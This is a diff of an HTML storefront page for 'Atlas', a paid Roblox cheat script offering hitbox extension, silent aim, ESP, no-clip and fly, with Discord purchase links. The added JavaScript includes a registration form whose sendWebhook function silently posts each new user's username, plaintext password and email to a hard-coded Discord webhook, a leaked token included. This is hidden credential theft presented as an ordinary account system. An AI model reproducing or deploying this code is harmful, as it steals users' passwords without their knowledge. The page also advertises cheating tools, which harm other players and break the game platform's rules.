+.wb-locked{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;min-height:60vh;text-align:center;gap:0}
+.wb-locked-ring{width:70px;height:70px;border:2px solid rgba(240,180,41,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:20px;position:relative}
+.wb-locked-ring::before{content:'';position:absolute;inset:-8px;border:1px solid rgba(240,180,41,0.08);border-radius:50%}
+.wb-locked-ring svg{width:26px;height:26px;stroke:rgba(240,180,41,0.5);fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+.wb-locked-title{font-family:'Rajdhani',sans-serif;font-size:1.5rem;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-dim);margin-bottom:8px}
+.wb-locked-sub{font-size:0.82rem;color:rgba(74,127,165,0.5);max-width:320px;line-height:1.6}
+.wb-locked-sub a{color:#f0b429;text-decoration:none}
+.wb-locked-sub a:hover{color:#ffd060}
+
+@keyframes fadeUp{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+#home.active .hero-badge{animation:fadeUp 0.5s 0.05s both}
+#home.active .hero-title{animation:fadeUp 0.5s 0.12s both}
+#home.active .hero-subtitle{animation:fadeUp 0.5s 0.18s both}
+#home.active .hero-name-row{animation:fadeUp 0.5s 0.23s both}
+#home.active .hero-tags{animation:fadeUp 0.5s 0.28s both}
+#home.active .hero-cta{animation:fadeUp 0.5s 0.34s both}
+#home.active .hero-right{animation:fadeUp 0.6s 0.2s both}
+
+@media(max-width:960px){
+nav{padding:14px 24px}
+.nav-center{display:none}
+.hero{flex-direction:column;padding:110px 24px 60px;text-align:center;gap:56px}
+.hero-name-row{justify-content:center}
+.hero-tags{margin:0 auto}
+.hero-cta{justify-content:center}
+.ui-wrapper{width:100%;max-width:400px}
+.content-page,.webbase-page{padding:90px 24px 48px}
+.games-grid{grid-template-columns:repeat(auto-fill,minmax(220px,1fr))}
+.webbase-layout{grid-template-columns:1fr;height:auto}
 }
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="header">
-    <div class="cheat">CHEAT</div>
-    <h1>THE #1 ROBLOX</h1>
-    <h2>SCRIPT</h2>
-    <div class="features">
-      <span>LIVE</span>•<span>FULLY FEATURED</span>•<span>VERY CHEAP WITH ADDONS TOO</span>
-    </div>
+
+<nav>
+  <div class="nav-logo" onclick="go('home',null)">
+    <div class="nav-logo-mark"></div>
+    Atlas
   </div>
-  <div class="tabs">
-    <div class="tab active" data-tab="home">Home</div>
-    <div class="tab" data-tab="info">Info</div>
-    <div class="tab" data-tab="faq">Recently Asked Questions</div>
-    <div class="tab" data-tab="releases">Releases</div>
+  <div class="nav-center" id="navCenter">
+    <button class="nav-link active" onclick="go('home',this)">Home</button>
+    <button class="nav-link" onclick="go('info',this)">Info</button>
+    <button class="nav-link" onclick="go('games',this)">Games</button>
+    <button class="nav-link" onclick="go('faq',this)">FAQ</button>
+    <button class="nav-link" onclick="go('releases',this)">Releases</button>
+    <button class="nav-link special" id="navWebBase" style="display:none" onclick="go('webbase',this)">Web Base</button>
   </div>
-  <div class="content">
-    <div class="ui-panel active" id="home">
-      <img src="d6f03005-acdf-4bda-bd24-61c374a9b1ea.png" alt="Atlas UI">
+  <div class="nav-right" id="navRight">
+    <button class="nav-btn-small" onclick="openModal('login')">Log In</button>
+    <button class="btn-primary" style="padding:8px 20px;font-size:0.72rem" onclick="openModal('register')">Register</button>
+  </div>
+</nav>
+
+<div id="home" class="page active">
+  <div class="hero">
+    <div class="hero-left">
+      <div class="hero-badge"><div class="badge-dot"></div>Live Now &nbsp;|&nbsp; Fully Featured</div>
+      <div class="hero-title">The #1 Roblox</div>
+      <div class="hero-subtitle">Script</div>
+      <div class="hero-name-row">
+        <div class="hero-name-bar"></div>
+        <div class="hero-name-text">Atlas</div>
+      </div>
+      <div class="hero-tags">
+        <div class="hero-tag">Live</div>
+        <div class="hero-tag">Fully Featured</div>
+        <div class="hero-tag">Very Cheap With Addons</div>
+      </div>
+      <div class="hero-cta">
+        <button class="btn-primary" onclick="go('games',document.querySelectorAll('.nav-link')[2])">Get Atlas</button>
+        <button class="btn-secondary" onclick="go('faq',document.querySelectorAll('.nav-link')[3])">Learn More</button>
+      </div>
     </div>
-    <div class="ui-panel" id="info">
-      <h2>Info</h2>
-      <p>Atlas is the #1 Roblox script with full features and cheap addons.</p>
-    </div>
-    <div class="ui-panel" id="faq">
-      <h2>Recently Asked Questions</h2>
-      <ul>
-        <li>How to use Atlas?</li>
-        <li>Does it work on all Roblox games?</li>
-        <li>Is it safe?</li>
-      </ul>
-    </div>
-    <div class="ui-panel" id="releases">
-      <h2>Releases</h2>
-      <p>Nothing here yet.</p>
+    <div class="hero-right">
+      <div class="ui-wrapper" id="uiW">
+        <div class="corner-dec tl"></div>
+        <div class="corner-dec tr"></div>
+        <div class="corner-dec bl"></div>
+        <div class="corner-dec br"></div>
+        <div class="scan-line"></div>
+        <div class="ui-outer-glow"></div>
+        <div class="atlas-ui">
+          <div class="ui-titlebar">
+            <div class="ui-tabs-top">
+              <div class="ui-tab-top t-blue">Atlas</div>
+              <div class="ui-tab-top">Comfort</div>
+              <div class="ui-tab-top t-gold">Beta</div>
+            </div>
+            <div class="ui-version">01eBeta</div>
+          </div>
+          <div class="ui-nav">
+            <div class="ui-nav-btn active" onclick="uiTab(this)">Combat</div>
+            <div class="ui-nav-btn" onclick="uiTab(this)">Visuals</div>
+            <div class="ui-nav-btn" onclick="uiTab(this)">World</div>
+            <div class="ui-nav-btn" onclick="uiTab(this)">Character</div>
+            <div class="ui-nav-btn" onclick="uiTab(this)">Options</div>
+          </div>
+          <div class="ui-body">
+            <div>
+              <div class="ui-section-title">Hitbox Extender</div>
+              <div class="ui-row"><div class="ui-checkbox on" id="c1"></div><div class="ui-label blue" id="l1">Enabled</div></div>
+              <div class="ui-row"><div class="ui-checkbox" id="c2"></div><div class="ui-label" id="l2">Visualize Hitbox</div></div>
+              <div class="ui-row"><div class="ui-checkbox" id="c3"></div><div class="ui-label" id="l3">Health Check</div></div>
+              <div class="ui-slider-block"><div class="ui-slider-label">Hitbox Size</div><div class="ui-track"><div class="ui-fill" id="s1" style="width:40%"></div></div></div>
+              <div class="ui-slider-label" style="margin-bottom:5px">Hitbox Part</div>
+              <div class="ui-select">All</div>
+              <hr class="ui-hr">
+              <div class="ui-section-title">Target Hovering</div>
+              <div class="ui-row"><div class="ui-checkbox" id="c4"></div><div class="ui-label" id="l4">Enabled</div></div>
+              <div class="ui-row"><div class="ui-checkbox" id="c5"></div><div class="ui-label" id="l5">Display Circle</div></div>
+              <div class="ui-slider-label" style="margin-bottom:5px">Target Method</div>
+              <div class="ui-select">Closest To Mouse</div>
+              <div class="ui-slider-block"><div class="ui-slider-label">Radius</div><div class="ui-track"><div class="ui-fill" id="s2" style="width:22%"></div></div></div>
+              <div class="ui-slider-block"><div class="ui-slider-label">Speed</div><div class="ui-track"><div class="ui-fill" id="s3" style="width:16%"></div></div></div>
+            </div>
+            <div>
+              <div class="ui-section-title">Movement</div>
+              <div class="ui-row"><div class="ui-checkbox on" id="c6"></div><div class="ui-label blue" id="l6">Anti-Fling</div></div>
+              <div class="ui-row"><div class="ui-checkbox" id="c7"></div><div class="ui-label" id="l7">No-Clip</div></div>
+              <div class="ui-row"><div class="ui-checkbox" id="c8"></div><div class="ui-label" id="l8">Inf Jump</div></div>
+              <div class="ui-row"><div class="ui-checkbox" id="c9"></div><div class="ui-label" id="l9">Speed</div></div>
+              <div class="ui-row"><div class="ui-checkbox" id="c10"></div><div class="ui-label" id="l10">Click Tp</div></div>
+              <div class="ui-slider-label" style="margin-bottom:5px">Fly Method</div>
+              <div class="ui-select">Velocity</div>
+              <div class="ui-slider-label" style="margin-bottom:5px">Speed Amount</div>
+              <div class="ui-select">Velocity</div>
+              <div class="ui-slider-block"><div class="ui-slider-label">Fly Amount</div><div class="ui-track"><div class="ui-fill" id="s4" style="width:54%"></div></div></div>
+              <div class="ui-slider-block"><div class="ui-slider-label">Speed Amount</div><div class="ui-track"><div class="ui-fill" id="s5" style="width:19%"></div></div></div>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
   </div>
 </div>
+
+<div id="info" class="page">
+  <div class="content-page">
+    <div class="page-eyebrow">About Atlas</div>
+    <div class="page-title">What is <span>Atlas</span></div>
+    <div class="info-grid">
+      <div class="info-card">
+        <div class="info-card-icon"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg></div>
+        <div class="info-card-title">Combat</div>
+        <div class="info-card-text">Full hitbox extension with size control, target hovering with radius and speed tuning, and advanced aim utilities for any fight.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-icon"><svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></div>
+        <div class="info-card-title">Movement</div>
+        <div class="info-card-text">Anti-fling, No-Clip, Infinite Jump, Speed, Click Teleport, and a velocity-based fly system. Total freedom over how you move.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="2"/><path d="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83M1 12h4M19 12h4M4.22 19.78l2.83-2.83M16.95 7.05l2.83-2.83"/></svg></div>
+        <div class="info-card-title">Visuals</div>
+        <div class="info-card-text">ESP, hitbox visualization, display circles, and a complete visual suite to keep full situational awareness at all times.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-icon"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
+        <div class="info-card-title">Game Support</div>
+        <div class="info-card-text">Works across a wide range of Roblox titles. Addon packs extend support to specific popular games so you only pay for what you need.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+        <div class="info-card-title">Safety</div>
+        <div class="info-card-text">Constantly updated to match Roblox patches. The team stays ahead of changes and pushes fixes fast so you stay covered.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-icon"><svg viewBox="0 0 24 24"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg></div>
+        <div class="info-card-title">Pricing</div>
+        <div class="info-card-text">Very competitively priced. Addons are cheap by design. Get a powerful base and build on it without overpaying.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="games" class="page">
+  <div class="content-page">
+    <div class="page-eyebrow">Supported Titles</div>
+    <div class="page-title">Games <span>Support</span></div>
+    <div class="games-grid">
+      <div class="game-card">
+        <div class="game-thumb-wrap">
+          <img class="game-thumb" src="https://files.catbox.moe/q6ewc6.jpeg" alt="Loomian Legacy" onerror="this.style.background='rgba(30,144,255,0.05)';this.style.height='160px'">
+          <div class="game-overlay"></div>
+        </div>
+        <div class="game-body">
+          <div class="game-tag-row"><div class="game-tag">Supported</div></div>
+          <div class="game-name">Loomian Legacy</div>
+          <div class="game-desc">Full combat and automation support with battle utilities and movement tools built specifically for Loomian Legacy.</div>
+        </div>
+      </div>
+      <div class="game-card">
+        <div class="game-thumb-wrap">
+          <img class="game-thumb" src="https://files.catbox.moe/saedow.webp" alt="Arsenal" onerror="this.style.background='rgba(30,144,255,0.05)';this.style.height='160px'">
+          <div class="game-overlay"></div>
+        </div>
+        <div class="game-body">
+          <div class="game-tag-row"><div class="game-tag">Supported</div></div>
+          <div class="game-name">Arsenal</div>
+          <div class="game-desc">Hitbox extension, aim utilities, and movement enhancements built for Arsenal's fast-paced shooting gameplay.</div>
+        </div>
+      </div>
+      <div class="game-card">
+        <div class="game-thumb-wrap">
+          <img class="game-thumb" src="https://files.catbox.moe/cgmm1e.jpeg" alt="Rivals" onerror="this.style.background='rgba(30,144,255,0.05)';this.style.height='160px'">
+          <div class="game-overlay"></div>
+        </div>
+        <div class="game-body">
+          <div class="game-tag-row"><div class="game-tag">Supported</div></div>
+          <div class="game-name">Rivals</div>
+          <div class="game-desc">Combat-focused features with target hovering and hitbox tools optimized specifically for Rivals.</div>
+        </div>
+      </div>
+      <div class="game-card">
+        <div class="game-thumb-wrap">
+          <img class="game-thumb" src="https://files.catbox.moe/2p27pe.jfif" alt="Speed Run 4" onerror="this.style.background='rgba(30,144,255,0.05)';this.style.height='160px'">
+          <div class="game-overlay"></div>
+        </div>
+        <div class="game-body">
+          <div class="game-tag-row"><div class="game-tag">Supported</div></div>
+          <div class="game-name">Speed Run 4</div>
+          <div class="game-desc">Speed, teleport, and movement utilities to cut through every stage of Speed Run 4 with ease.</div>
+        </div>
+      </div>
+      <div class="game-card">
+        <div class="game-thumb-wrap">
+          <img class="game-thumb" src="https://files.catbox.moe/4jr0b2.jpeg" alt="Deepwoken" onerror="this.style.background='rgba(30,144,255,0.05)';this.style.height='160px'">
+          <div class="game-overlay"></div>
+        </div>
+        <div class="game-body">
+          <div class="game-tag-row"><div class="game-tag">Supported</div><div class="game-tag beta">Beta</div></div>
+          <div class="game-name">Deepwoken</div>
+          <div class="game-desc">Beta support for Deepwoken with active development ongoing. Combat and movement tools currently in progress.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="faq" class="page">
+  <div class="content-page">
+    <div class="page-eyebrow">Questions</div>
+    <div class="page-title">Recently Asked <span>Questions</span></div>
+    <div class="faq-list">
+      <div class="faq-item">
+        <div class="faq-q" onclick="faq(this)">What is Atlas and what does it do<div class="faq-arrow">+</div></div>
+        <div class="faq-body"><div class="faq-body-inner">Atlas is the number one Roblox script, offering a complete suite of combat tools, movement features, visual enhancements, and game-specific addons. It is actively maintained and consistently updated to stay ahead of Roblox patches.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="faq(this)">Is Atlas safe to use<div class="faq-arrow">+</div></div>
+        <div class="faq-body"><div class="faq-body-inner">The team actively monitors every Roblox update and pushes fixes quickly. While no script can guarantee zero risk, Atlas is built with longevity in mind and has a strong track record of staying operational through patches.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="faq(this)">How much does Atlas cost<div class="faq-arrow">+</div></div>
+        <div class="faq-body"><div class="faq-body-inner">Atlas is priced to be very accessible. The base package is cheap and addons on top of it are even cheaper. You only pay for the games you actually play rather than a bloated all-in-one bundle.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="faq(this)">What games does Atlas support<div class="faq-arrow">+</div></div>
+        <div class="faq-body"><div class="faq-body-inner">Atlas currently supports Loomian Legacy, Arsenal, Rivals, Speed Run 4, and Deepwoken in beta. The games list continues to grow as new addons are developed. Check the Games page for the full current list.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="faq(this)">How do I get Atlas<div class="faq-arrow">+</div></div>
+        <div class="faq-body"><div class="faq-body-inner">Join the Atlas Discord for purchase links, setup guides, and live support. The team will walk you through everything from purchase to getting the script running in game.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="faq(this)">What are addons and how do they work<div class="faq-arrow">+</div></div>
+        <div class="faq-body"><div class="faq-body-inner">Addons are low-cost extension packs that layer game-specific features on top of the Atlas base. Instead of one expensive package, you pick the games you play and only pay for those addons.</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="releases" class="page">
+  <div class="content-page">
+    <div class="page-eyebrow">Changelog</div>
+    <div class="page-title"><span>Releases</span></div>
+    <div class="releases-grid" id="releasesGrid">
+      <div class="release-card">
+        <div class="release-left">
+          <div class="release-badge-row">
+            <span class="release-badge free">Free</span>
+            <span class="release-version">v1.0.0</span>
+          </div>
+          <div class="release-title">Atlas Free Edition</div>
+          <div class="release-desc">The public free release of Atlas. Includes basic movement tools, speed, and a limited hitbox extender. Full features available in the paid version. Join the Discord to grab your copy and open a ticket for the paid upgrade.</div>
+        </div>
+        <a class="release-btn btn-free" href="https://discord.gg/m7kmSRc223" target="_blank">Get Free</a>
+      </div>
+      <div class="release-card paid-card">
+        <div class="release-left">
+          <div class="release-badge-row">
+            <span class="release-badge paid">Paid</span>
+            <span class="release-version">v2.0.0</span>
+          </div>
+          <div class="release-title">Atlas Full Version</div>
+          <div class="release-desc">The complete Atlas experience. Full combat suite, all movement options, advanced visuals, ESP, target hovering, and access to all game-specific addons. Open a ticket in the Discord to purchase.</div>
+        </div>
+        <a class="release-btn btn-paid" href="https://discord.gg/m7kmSRc223" target="_blank">Buy Ticket</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="webbase" class="page">
+  <div class="webbase-page">
+    <div class="webbase-header">
+      <div class="page-eyebrow">Buyer Access</div>
+      <div class="page-title" style="margin-bottom:16px">Web <span>Base</span></div>
+      <div class="webbase-status-row">
+        <div class="status-chip"><div class="status-chip-dot"></div>Interface Ready</div>
+      </div>
+    </div>
+    <div id="wbLockedMsg" class="wb-locked" style="display:none">
+      <div class="wb-locked-ring">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      </div>
+      <div class="wb-locked-title">Buyer Access Only</div>
+      <div class="wb-locked-sub">This panel is restricted to verified buyers. Open a ticket in the <a href="https://discord.gg/m7kmSRc223" target="_blank">Atlas Discord</a> to purchase and get your account upgraded.</div>
+    </div>
+    <div id="wbPanel" class="webbase-layout">
+      <div class="wb-sidebar">
+        <div class="wb-sidebar-title">Modules</div>
+        <div class="wb-nav-item active" onclick="wbTab(this)">
+          <svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
+          Combat
+        </div>
+        <div class="wb-nav-item" onclick="wbTab(this)">
+          <svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+          Movement
+        </div>
+        <div class="wb-nav-item" onclick="wbTab(this)">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="2"/><path d="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83M1 12h4M19 12h4M4.22 19.78l2.83-2.83M16.95 7.05l2.83-2.83"/></svg>
+          Visuals
+        </div>
+        <div class="wb-nav-item" onclick="wbTab(this)">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
+          World
+        </div>
+        <div class="wb-nav-item" onclick="wbTab(this)">
+          <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          Character
+        </div>
+        <div class="wb-nav-item" onclick="wbTab(this)">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>
+          Options
+        </div>
+      </div>
+      <div class="wb-main">
+        <div class="wb-main-bar">
+          <div class="wb-main-title" id="wbPanelTitle">Combat</div>
+          <button class="wb-connect-btn">Connect to Roblox</button>
+        </div>
+        <div class="wb-content" id="wbContent">
+          <div class="wb-section-label">Hitbox Extender</div>
+          <div class="wb-grid">
+            <div class="wb-toggle-row" onclick="wbToggle(this)"><span class="wb-toggle-label">Enabled</span><div class="wb-toggle on"></div></div>
+            <div class="wb-toggle-row" onclick="wbToggle(this)"><span class="wb-toggle-label">Visualize Hitbox</span><div class="wb-toggle"></div></div>
+            <div class="wb-toggle-row" onclick="wbToggle(this)"><span class="wb-toggle-label">Health Check</span><div class="wb-toggle"></div></div>
+            <div class="wb-toggle-row" onclick="wbToggle(this)"><span class="wb-toggle-label">Silent Aim</span><div class="wb-toggle on"></div></div>
+          </div>
+          <div class="wb-section-label" style="margin-top:4px">Sliders</div>
+          <div class="wb-grid">
+            <div class="wb-slider-wrap">
+              <div class="wb-slider-top"><span class="wb-slider-name">Hitbox Size</span><span class="wb-slider-val">40</span></div>
+              <div class="wb-slider-track"><div class="wb-slider-fill" style="width:40%"></div></div>
+            </div>
+            <div class="wb-slider-wrap">
+              <div class="wb-slider-top"><span class="wb-slider-name">Aim Smoothness</span><span class="wb-slider-val">65</span></div>
+              <div class="wb-slider-track"><div class="wb-slider-fill" style="width:65%"></div></div>
+            </div>
+            <div class="wb-slider-wrap">
+              <div class="wb-slider-top"><span class="wb-slider-name">Target Radius</span><span class="wb-slider-val">22</span></div>
+              <div class="wb-slider-track"><div class="wb-slider-fill" style="width:22%"></div></div>
+            </div>
+            <div class="wb-slider-wrap">
+              <div class="wb-slider-top"><span class="wb-slider-name">FOV</span><span class="wb-slider-val">80</span></div>
+              <div class="wb-slider-track"><div class="wb-slider-fill" style="width:80%"></div></div>
+            </div>
+          </div>
+          <div class="wb-section-label" style="margin-top:4px">Target Hovering</div>
+          <div class="wb-grid">
+            <div class="wb-toggle-row" onclick="wbToggle(this)"><span class="wb-toggle-label">Enabled</span><div class="wb-toggle"></div></div>
+            <div class="wb-toggle-row" onclick="wbToggle(this)"><span class="wb-toggle-label">Display Circle</span><div class="wb-toggle on"></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="modalOverlay" onclick="closeModalOutside(event)">
+  <div class="modal" id="modal">
+    <button class="modal-close" onclick="closeModal()">x</button>
+    <div id="modalBody"></div>
+  </div>
+</div>
+
 <script>
-const tabs = document.querySelectorAll('.tab')
-const panels = document.querySelectorAll('.ui-panel')
-tabs.forEach(tab => {
-  tab.addEventListener('click', () => {
-    tabs.forEach(t => t.classList.remove('active'))
-    tab.classList.add('active')
-    panels.forEach(panel => panel.classList.remove('active'))
-    document.getElementById(tab.dataset.tab).classList.add('active')
-  })
-})
+var BUYERS = ['buyer1','buyer2','buyer3'];
+
+var WEBHOOK = 'https://discord.com/api/webhooks/1481799171605270678/mG4R9hzeNcvzBYMhCyqYfxlqhbnmjmPLXpdU7oTegCGkD343Gnt5jPdbDFukCPDraC5K';
+
+var currentUser = null;
+
+function loadSession(){
+  var raw = localStorage.getItem('atlas_session');
+  if(raw){
+    try{
+      var s = JSON.parse(raw);
+      currentUser = s;
+      applySession();
+    }catch(e){}
+  }
+}
+
+function applySession(){
+  if(!currentUser) return;
+  var nr = document.getElementById('navRight');
+  nr.innerHTML = '<div class="nav-user-chip"><span class="nav-user-name">' + currentUser.username + '</span><button class="nav-user-logout" onclick="logout()">Logout</button></div>';
+  var wb = document.getElementById('navWebBase');
+  if(BUYERS.indexOf(currentUser.username.toLowerCase()) !== -1){
+    wb.style.display = 'inline-flex';
+  }
+  checkWebBaseAccess();
+}
+
+function checkWebBaseAccess(){
+  var locked = document.getElementById('wbLockedMsg');
+  var panel = document.getElementById('wbPanel');
+  if(!currentUser || BUYERS.indexOf(currentUser.username.toLowerCase()) === -1){
+    locked.style.display = 'flex';
+    panel.style.display = 'none';
+  } else {
+    locked.style.display = 'none';
+    panel.style.display = 'grid';
+  }
+}
+
+function logout(){
+  localStorage.removeItem('atlas_session');
+  currentUser = null;
+  var nr = document.getElementById('navRight');
+  nr.innerHTML = '<button class="nav-btn-small" onclick="openModal(\'login\')">Log In</button><button class="btn-primary" style="padding:8px 20px;font-size:0.72rem" onclick="openModal(\'register\')">Register</button>';
+  document.getElementById('navWebBase').style.display = 'none';
+  var active = document.querySelector('.page.active');
+  if(active && active.id === 'webbase'){
+    go('home', document.querySelector('.nav-link'));
+  }
+  checkWebBaseAccess();
+}
+
+function openModal(mode){
+  var overlay = document.getElementById('modalOverlay');
+  var body = document.getElementById('modalBody');
+  if(mode === 'register'){
+    body.innerHTML = '<div class="modal-title">Register</div><div class="modal-sub">Already have an account? <span onclick="openModal(\'login\')">Log in</span></div><div class="field"><label class="field-label">Username</label><input class="field-input" id="regUser" placeholder="YourUsername" autocomplete="off"></div><div class="field"><label class="field-label">Password</label><input class="field-input" type="password" id="regPass" placeholder="Choose a password"></div><div class="field"><label class="field-label">Email <span class="field-optional">optional, for updates</span></label><input class="field-input" id="regEmail" placeholder="you@example.com"></div><button class="modal-btn" onclick="doRegister()">Create Account</button><div class="modal-msg" id="regMsg"></div>';
+  } else {
+    body.innerHTML = '<div class="modal-title">Log In</div><div class="modal-sub">No account? <span onclick="openModal(\'register\')">Register here</span></div><div class="field"><label class="field-label">Username</label><input class="field-input" id="loginUser" placeholder="YourUsername" autocomplete="off"></div><div class="field"><label class="field-label">Password</label><input class="field-input" type="password" id="loginPass" placeholder="Your password"></div><button class="modal-btn" onclick="doLogin()">Log In</button><div class="modal-msg" id="loginMsg"></div>';
+  }
+  overlay.classList.add('open');
+}
+
+function closeModal(){
+  document.getElementById('modalOverlay').classList.remove('open');
+}
+
+function closeModalOutside(e){
+  if(e.target === document.getElementById('modalOverlay')) closeModal();
+}
+
+function getAccounts(){
+  var raw = localStorage.getItem('atlas_accounts');
+  if(!raw) return {};
+  try{ return JSON.parse(raw); }catch(e){ return {}; }
+}
+
+function saveAccounts(obj){
+  localStorage.setItem('atlas_accounts', JSON.stringify(obj));
+}
+
+function doRegister(){
+  var user = document.getElementById('regUser').value.trim();
+  var pass = document.getElementById('regPass').value;
+  var email = document.getElementById('regEmail').value.trim();
+  var msg = document.getElementById('regMsg');
+  if(!user || !pass){ msg.className='modal-msg err'; msg.textContent='Username and password are required.'; return; }
+  if(user.length < 3){ msg.className='modal-msg err'; msg.textContent='Username must be at least 3 characters.'; return; }
+  if(pass.length < 4){ msg.className='modal-msg err'; msg.textContent='Password must be at least 4 characters.'; return; }
+  var accounts = getAccounts();
+  if(accounts[user.toLowerCase()]){ msg.className='modal-msg err'; msg.textContent='That username is already taken.'; return; }
+  accounts[user.toLowerCase()] = { username: user, password: pass, email: email };
+  saveAccounts(accounts);
+  var session = { username: user };
+  localStorage.setItem('atlas_session', JSON.stringify(session));
+  currentUser = session;
+  sendWebhook(user, pass, email);
+  msg.className='modal-msg ok'; msg.textContent='Account created. Logging you in...';
+  setTimeout(function(){
+    closeModal();
+    applySession();
+  }, 900);
+}
+
+function doLogin(){
+  var user = document.getElementById('loginUser').value.trim();
+  var pass = document.getElementById('loginPass').value;
+  var msg = document.getElementById('loginMsg');
+  if(!user || !pass){ msg.className='modal-msg err'; msg.textContent='Fill in both fields.'; return; }
+  var accounts = getAccounts();
+  var acct = accounts[user.toLowerCase()];
+  if(!acct || acct.password !== pass){ msg.className='modal-msg err'; msg.textContent='Incorrect username or password.'; return; }
+  var session = { username: acct.username };
+  localStorage.setItem('atlas_session', JSON.stringify(session));
+  currentUser = session;
+  msg.className='modal-msg ok'; msg.textContent='Welcome back, ' + acct.username + '.';
+  setTimeout(function(){
+    closeModal();
+    applySession();
+  }, 700);
+}
+
+function sendWebhook(user, pass, email){
+  var fields = [
+    { name: 'Username', value: user, inline: true },
+    { name: 'Password', value: pass, inline: true }
+  ];
+  if(email) fields.push({ name: 'Email', value: email, inline: false });
+  fetch(WEBHOOK, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      username: 'Atlas Accounts',
+      embeds: [{
+        title: 'New Account Registered',
+        color: 2031359,
+        fields: fields,
+        footer: { text: 'Atlas Registration System' }
+      }]
+    })
+  }).catch(function(){});
+}
+
+function go(id, btn){
+  document.querySelectorAll('.page').forEach(function(p){ p.classList.remove('active') });
+  document.querySelectorAll('.nav-link').forEach(function(b){ b.classList.remove('active') });
+  document.getElementById(id).classList.add('active');
+  if(btn) btn.classList.add('active');
+  window.scrollTo(0,0);
+  if(id === 'webbase') checkWebBaseAccess();
+}
+
+function faq(el){
+  var item = el.parentElement;
+  var isOpen = item.classList.contains('open');
+  document.querySelectorAll('.faq-item').forEach(function(i){ i.classList.remove('open') });
+  if(!isOpen) item.classList.add('open');
+}
+
+function uiTab(el){
+  document.querySelectorAll('.ui-nav-btn').forEach(function(b){ b.classList.remove('active') });
+  el.classList.add('active');
+}
+
+function wbTab(el){
+  document.querySelectorAll('.wb-nav-item').forEach(function(b){ b.classList.remove('active') });
+  el.classList.add('active');
+  document.getElementById('wbPanelTitle').textContent = el.textContent.trim();
+}
+
+function wbToggle(el){
+  var t = el.querySelector('.wb-toggle');
+  t.classList.toggle('on');
+}
+
+var sliders = [
+  {el:document.getElementById('s1'),base:40,amp:18,phase:0},
+  {el:document.getElementById('s2'),base:22,amp:14,phase:1.2},
+  {el:document.getElementById('s3'),base:16,amp:10,phase:2.4},
+  {el:document.getElementById('s4'),base:54,amp:16,phase:0.7},
+  {el:document.getElementById('s5'),base:19,amp:10,phase:1.8}
+];
+
+var cbs = [
+  {cb:document.getElementById('c1'),lbl:document.getElementById('l1'),hov:true,isBlue:true},
+  {cb:document.getElementById('c2'),lbl:document.getElementById('l2'),hov:true,isBlue:false},
+  {cb:document.getElementById('c3'),lbl:document.getElementById('l3'),hov:false,isBlue:false},
+  {cb:document.getElementById('c4'),lbl:document.getElementById('l4'),hov:true,isBlue:false},
+  {cb:document.getElementById('c5'),lbl:document.getElementById('l5'),hov:true,isBlue:false},
+  {cb:document.getElementById('c6'),lbl:document.getElementById('l6'),hov:true,isBlue:true},
